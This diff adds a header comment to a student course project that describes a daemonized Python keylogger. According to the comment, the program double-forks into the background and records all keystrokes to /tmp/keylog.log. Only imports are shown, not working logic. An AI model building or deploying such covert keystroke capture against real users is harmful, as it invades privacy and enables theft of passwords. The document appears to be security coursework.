@@ -1,5 +1,55 @@
 #!/usr/bin/python3
 
+#==============================================================================
+ #      Assignment: DPI912 Term Project
+ #      Daemonized Key Logger
+ #
+ #      Authors: Sang Min Park, Jacky Tea
+ #      Student ID (Sang Min Park): 124218173
+ #      Student ID (Jacky Tea): 152078168
+ #      Language: Python3
+ #      Libraries Used: keyboard, pynput, sys, os, atexit, signal, logzero
+ #
+ #      To compile with python3 >>> python3 a1KeyLogger.py start
+ #      To compile with executable >>> chmod 700 a1KeyLogger.py
+ #                                 >>> ./a1KeyLogger.py start
+ #
+ #      Class: DPI912 NSB - Python for Programmers: Sockets and Security 
+ #      Professor: Dr. Harvey Kaduri
+ #      Due Date: Friday, December 6, 2019, 5:50 PM EST
+ #      Submitted:  
+ #
+ #-----------------------------------------------------------------------------
+ #
+ #      Cookbook code utilized from the following source:
+ #      https://github.com/dabeaz/python-cookbook/blob/master/src/12/launching_a_daemon_process_on_unix/daemon.py
+ #
+ #      Description: A keystroke logging program that records all keystrokes that
+ #      a user inputs into their keyboard. This program runs in the background via forking.
+ #
+ #      Input: A command line argument of either 'start' or 'stop'. For example:
+ #      ./a1KeyLogger.py start. 'start' will execute the key logger, 'stop' will 
+ #      kill its background process.
+ #
+ #      Output: A file in /tmp called 'keylog.log', full path: '/tmp/keylog.log'.
+ #      This file contains all keystrokes recorded up till the time the daemon is 
+ #      terminated. Another file in the path: '/tmp/keylog.log' is generated to keep
+ #      track of the daemon's PID value once it double forks from the terminal.
+ #
+ #      Algorithm: Performs a check to see if PID file exists, if it does, an error
+ #      is thrown to indicate that a daemon instance is already running. If not, 
+ #      the program forks off twice to separate itself as a background process
+ #      away from the terminal and begins to detecting any keystrokes put into 
+ #      the keyboard. All keystrokes are then logged to a log file until the 
+ #      the machine is shut off, or a SIGHUP or a SIGTERM is detected to terminate 
+ #      the daemon. 
+ #
+ #      Required Features Not Included:
+ #
+ #      Known Bugs: os.kill() can be disrupted at times, leaving the process running.
+ #
+#==============================================================================
+
 from pynput import keyboard
 import sys
 import os
